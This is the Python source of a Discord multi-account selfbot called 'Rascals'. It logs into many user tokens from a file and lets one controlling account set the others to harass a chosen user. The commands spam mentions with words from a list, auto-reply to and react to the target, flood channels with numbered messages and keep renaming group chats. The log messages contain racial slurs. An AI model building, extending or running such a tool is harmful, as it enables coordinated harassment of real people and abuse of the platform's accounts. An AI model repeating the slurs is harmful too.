import asyncio
import logging
import random

logging.basicConfig(level=logging.INFO)

intents = discord.Intents.default()
intents.messages = True
intents.reactions = True
try:
    intents.message_content = True
except AttributeError:
    pass

class DiscordClient(discord.Client):
    def __init__(self, token, is_main, alt_clients=None, *args, **kwargs):
        super().__init__(*args, **kwargs, intents=intents)
        self.token = token
        self.is_main = is_main
        self.alt_clients = alt_clients if alt_clients else []
        self.react_emoji = None
        self.react_user_id = None
        self.fuck_user_id = None
        self.fuck_running = False
        self.fuck_task = None
        self.kill_user_id = None
        self.kill_running = False
        self.kill_task = None
        self.ar_running = False
        self.ar_target_user_id = None
        self.ar_task = None
        self.ap_running = False
        self.ap_message = None
        self.ap_task = None
        self.ap_counter = 1
        self.gc_running = False
        self.gc_title = None
        self.gc_task = None
        self.gc_counter = 1

    async def on_ready(self):
        if self.is_main:
            logging.info(f"[Rascals] : Main token logged in as {self.user}")
        else:
            logging.info(f"[Rascals] : Alt token logged in as {self.user}")

    async def on_message(self, message):
        if self.is_main:
            if message.content.startswith("react "):
                parts = message.content.split()
                if len(parts) >= 3:
                    await message.delete()
                    self.react_emoji = parts[1]
                    try:
                        self.react_user_id = int(parts[2].strip('<@!>'))
                        logging.info(f"```xml\n[Rascals] : Reactor started reacting to user {self.react_user_id} with emoji {self.react_emoji}")
                        for client in self.alt_clients:
                            client.react_emoji = self.react_emoji
                            client.react_user_id = self.react_user_id
                    except ValueError:
                        logging.warning("```xml\n[Rascals] : [!] NIGGA MENTION THE ONE TO HOE DUMBASS\n```")
            elif message.content == "stop react":
                await message.delete()
                self.react_emoji = None
                self.react_user_id = None
                logging.info("```\n[Rascals] : Stopped reacting to user's messages\n```")
                for client in self.alt_clients:
                    client.react_emoji = None
                    client.react_user_id = None
            elif message.content.startswith("fuck "):
                parts = message.content.split()
                if len(parts) == 2:
                    await message.delete()
                    try:
                        self.fuck_user_id = int(parts[1].strip('<@!>'))
                        logging.info(f"```xml\n[Rascals] : Started sending random msgs to user {self.fuck_user_id}\n```")
                        for client in self.alt_clients:
                            client.fuck_user_id = self.fuck_user_id
                            client.fuck_running = True
                            client.fuck_task = asyncio.create_task(client.send_fuck_messages(message.channel.id))
                    except ValueError:
                        logging.warning("```xml\n[Rascals] : [!] NIGGA MENTION THE ONE TO HOE DUMBASS\n```")
            elif message.content == "sfuck":
                await message.delete()
                self.fuck_user_id = None
                self.fuck_running = False
                logging.info("```xml\n[Rascals] : Stopped sending random msgs to user\n```")
                for client in self.alt_clients:
                    client.fuck_user_id = None
                    client.fuck_running = False
                    if client.fuck_task:
                        client.fuck_task.cancel()
                        client.fuck_task = None
            elif message.content.startswith("kill "):
                parts = message.content.split()
                if len(parts) == 2:
                    await message.delete()
                    try:
                        self.kill_user_id = int(parts[1].strip('<@!>'))
                        logging.info(f"Set to send kill messages to user {self.kill_user_id}")
                        for client in self.alt_clients:
                            client.killkill_user_id = self.kill_user_id
                            client.kill_running = True
                            client.kill_task = asyncio.create_task(client.send_kill_messages(message.channel.id))
                    except ValueError:
                        logging.warning("```xml\n[Rascals] : [!] NIGGA MENTION THE ONE TO HOE DUMBASS\n```")
            elif message.content == "stop kill":
                await message.delete()
                self.kill_user_id = None
                self.kill_running = False
                logging.info("```xml\n[Rascals] : Stopped sending kill messages to user\n```")
                for client in self.alt_clients:
                    client.kill_user_id = None
                    client.kill_running = False
                    if client.kill_task:
                        client.kill_task.cancel()
                        client.kill_task = None
            elif message.content.startswith("stream "):
                stream_message = message.content[len("stream "):].strip()
                await message.delete()
                logging.info(f"```xml\n[Rascals] : Setting streaming status to: {stream_message}\n```")
                await self.start_streaming(stream_message)
            elif message.content.startswith("ar "):
                parts = message.content.split(maxsplit=1)
                if len(parts) == 2:
                    await message.delete()
                    target_user_id = parts[1].strip('<@!>')
                    if target_user_id.isdigit():
                        self.ar_target_user_id = int(target_user_id)
                        self.ar_running = True
                        for client in self.alt_clients:
                            client.ar_target_user_id = self.ar_target_user_id
                            client.ar_running = True
                            client.ar_task = asyncio.create_task(client.auto_reply(message.channel.id))
            elif message.content == "stop ar":
                await message.delete()
                self.ar_running = False
                self.ar_target_user_id = None
                for client in self.alt_clients:
                    client.ar_running = False
                    client.ar_target_user_id = None
                    if client.ar_task:
                        client.ar_task.cancel()
                        client.ar_task = None
            elif message.content.startswith("ap "):
                parts = message.content.split(maxsplit=1)
                if len(parts) == 2:
                    await message.delete()
                    self.ap_message = parts[1]
                    self.ap_running = True
                    self.ap_counter = 1
                    for client in self.alt_clients:
                        client.ap_message = self.ap_message
                        client.ap_running = True
                        client.ap_counter = self.ap_counter
                        client.ap_task = asyncio.create_task(client.ap_spam(message.channel.id))
            elif message.content == "stop ap":
                await message.delete()
                self.ap_running = False
                self.ap_message = None
                for client in self.alt_clients:
                    client.ap_running = False
                    client.ap_message = None
                    if client.ap_task:
                        client.ap_task.cancel()
                        client.ap_task = None
            elif message.content.startswith("gcfuck "):
                parts = message.content.split(maxsplit=1)
                if len(parts) == 2:
                    await message.delete()
                    self.gc_title = parts[1]
                    self.gc_running = True
                    self.gc_counter = 1
                    for client in self.alt_clients:
                        client.gc_title = self.gc_title
                        client.gc_running = True
                        client.gc_counter = self.gc_counter
                        client.gc_task = asyncio.create_task(client.gc_change_title(message.channel.id))
            elif message.content == "stop gf":
                await message.delete()
                self.gc_running = False
                self.gc_title = None
                for client in self.alt_clients:
                    client.gc_running = False
                    client.gc_title = None
                    if client.gc_task:
                        client.gc_task.cancel()
                        client.gc_task = None
            elif message.content == "help":
                await self.send_help(message.channel)

        elif self.react_user_id and message.author.id == self.react_user_id:
            try:
                logging.info(f"[Rascals] : Reacting to message from user {self.react_user_id} with emoji {self.react_emoji}")
                await message.add_reaction(self.react_emoji)
            except discord.HTTPException as e:
                logging.error(f"Failed to add reaction: {e}")
            except Exception as e:
                logging.error(f"Unexpected error when adding reaction: {e}")

    async def send_fuck_messages(self, channel_id):
        if not self.fuck_user_id or not self.fuck_running:
            return

        try:
            with open('words.txt', 'r') as file:
                words = [line.strip() for line in file.readlines()]

            channel = self.get_channel(channel_id)
            if not channel:
                logging.error(f"Channel ID {channel_id} not found")
                return

            while self.fuck_running:
                word = random.choice(words)
                message = f"{word} <@{self.fuck_user_id}>"
                try:
                    await channel.send(message)
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        logging.warning(f"{self.user} rate limited, sleeping for 20 seconds")
                        await asyncio.sleep(20)
                        continue
                    else:
                        logging.error(f"Failed to send message: {e}")
                        break
                await asyncio.sleep(0.01 + random.random())
        except FileNotFoundError:
            logging.error("```[!] File words.txt not found.```")
        except asyncio.CancelledError:
            logging.info("```fuck task cancelled.```")
        except Exception as e:
            logging.error(f"[!] An unexpected error occurred while sending messages: {str(e)}")

    async def send_kill_messages(self, channel_id):
        if not self.kill_user_id or not self.kill_running:
            return

        try:
            with open('words.txt', 'r') as file:
                words = [line.strip() for line in file.readlines()]

            channel = self.get_channel(channel_id)
            if not channel:
                logging.error(f"Channel ID {channel_id} not found")
                return

            while self.kill_running:
                sentence = random.choice(words)
                split_words = sentence.split()
                combined_message = "\n".join(split_words) + f"\n<@{self.kill_user_id}>"
                try:
                    await channel.send(combined_message)
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        logging.warning(f"{self.user} rate limited, sleeping for 15 seconds")
                        await asyncio.sleep(15)
                        continue
                    else:
                        logging.error(f"Failed to send message: {e}")
                        break
                await asyncio.sleep(3)
        except FileNotFoundError:
            logging.error("File words.txt not found.")
        except asyncio.CancelledError:
            logging.info("kill task cancelled.")
        except Exception as e:
            logging.error(f"An unexpected error occurred while sending messages: {str(e)}")

    async def auto_reply(self, channel_id):
        try:
            with open('words.txt', 'r') as file:
                replies = [line.strip() for line in file.readlines()]

            channel = self.get_channel(channel_id)
            while self.ar_running:
                await asyncio.sleep(1)
                async for message in channel.history(limit=10):
                    if message.author.id == self.ar_target_user_id:
                        random_reply = random.choice(replies)
                        try:
                            await message.reply(random_reply)
                            logging.info(f"Response sent to {self.ar_target_user_id}: {random_reply}")
                        except discord.errors.HTTPException as e:
                            logging.error(f"Error sending reply: {e}")

        except FileNotFoundError:
            logging.error("```xml\n[Rascals] : [!] File words.txt not found.\n```")
        except Exception as e:
            logging.error(f"An unexpected error occurred in auto_reply: {str(e)}")

    async def ap_spam(self, channel_id):
        channel = self.get_channel(channel_id)
        while self.ap_running:
            try:
                if not self.ap_message:
                    break
                message_content = f"{self.ap_message} {self.ap_counter}"
                await channel.send(message_content)
                self.ap_counter += 1
                await asyncio.sleep(0.01)
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    logging.warning(f"Rate limited for token {self.token}. Waiting for 30 seconds...")
                    await asyncio.sleep(30)
                else:
                    await asyncio.sleep(1)

    async def gc_change_title(self, channel_id):
        channel = self.get_channel(channel_id)
        while self.gc_running:
            try:
                if not self.gc_title:
                    break
                message_content = f"{self.gc_title} {self.gc_counter}"
                if not self.is_main:
                    await channel.edit(name=message_content)
                    logging.info(f"Title changed to: {message_content} for token {self.token}")
                self.gc_counter += 1
                await asyncio.sleep(0.01)
            except discord.errors.HTTPException as e:
                logging.error(f"Error changing title for token {self.token}: {e}")
                if e.status == 429:
                    logging.warning(f"Rate limited for token {self.token}. Waiting for 30 seconds...")
                    await asyncio.sleep(30)
                else:
                    await asyncio.sleep(1)

    async def start_streaming(self, stream_message):
        tasks = []
        for client in self.alt_clients:
            logging.info(f"```xml\n[Rascals] : Setting streaming status for {client.user} with message: {stream_message}\n```")
            task = client.change_presence(activity=discord.Streaming(name=stream_message, url="https://twitch.tv/your_channel"))
            tasks.append(task)
        await asyncio.gather(*tasks)
        logging.info(f"```xml\n[Rascals] : Started streaming '{stream_message}' on all alt tokens\n```")

    async def send_help(self, channel):
        help_message = """```xml
[ BY GOD LEVI ]

<arguments> - mandatory input

[ Multitoken ]
``````xml
react <emoji> <@mention> - Reacts on specified user's msg with the given emoji.

stop react - Stops reacting ofc.

fuck <@user> - Sends random messages from words.txt to the specified user.

sfuck - Stops sending random messages.

kill <@user> - Sends messages from words.txt to the specified user.

stop kill - Stops kill cmd ofc.

stream <msg> - Sets streaming with given msg.

ar <@mention> - Replies to the user's messages with a random word from words.txt.

stop ar` - Stops ar ofc.

ap <msg>` - Spams the specified msg.

stop ap - Stops the spam task.

gcfuck <title> - starts changing gc title

sgf - Stops changing gc title

``````xml
     [ RASCALS ]
       ``` """
        await channel.send(help_message)

    async def start_bot(self):
        try:
            await self.start(self.token, bot=False)
        except Exception as e:
            logging.error(f"Failed to log in with token: {self.token}, Error: {str(e)}")

async def main():
    try:
        with open('tokens.txt', 'r') as file:
            tokens = [line.strip() for line in file.readlines()]

        if not tokens:
            logging.error("No tokens found in working.txt")
            return

        main_token = tokens[0]
        alt_tokens = tokens[1:]

        alt_clients = [DiscordClient(token, False) for token in alt_tokens]
        main_client = DiscordClient(main_token, True, alt_clients)

        tasks = [main_client.start_bot()] + [client.start_bot() for client in alt_clients]
        await asyncio.gather(*tasks)
    except FileNotFoundError:
        logging.error("File working.txt not found.")
    except Exception as e:
        logging.error(f"An unexpected error occurred in the main function: {str(e)}")

if __name__ == "__main__":
    asyncio.run(main())
cammultitoken.py
18 KB